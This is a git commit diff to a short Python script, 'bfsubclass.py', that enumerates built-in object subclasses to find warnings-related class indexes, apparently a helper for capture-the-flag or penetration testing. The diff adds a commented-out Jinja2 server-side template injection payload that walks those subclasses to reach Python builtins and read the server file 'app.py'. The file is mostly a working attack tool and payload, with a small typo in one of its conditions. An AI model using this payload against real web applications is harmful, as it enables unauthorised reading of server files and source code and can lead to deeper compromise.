e30f8d1d734b16739aad9e93bcdeae87da8a4e95
Aland Han <111860567+HoangVietAnh09@users.noreply.github.com>
2025-05-10 17:16:09 +0700

    Update bfsubclass.py

--- bfsubclass.py
+++ bfsubclass.py
@@ -1,4 +1,7 @@
-subclazz = ''.__class__.__bases__[0].__subclasses__()[:]
+subclazz = ''.__class__.__bases__[0].__subclasses__()
 for i in range(len(subclazz)):
     if 'warnings' in str(subclazz[i]):
         print(f'[+] INDEX: {i} - SUBCLAZZ: {str(subclazz[i])}')
+
+
+#{% for x in ''.__class__.__bases__[0].__subclasses__() %}{% if x.__name == 'catch_warnings' or x.__name__ == 'WarningMessage'%}{{ x.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
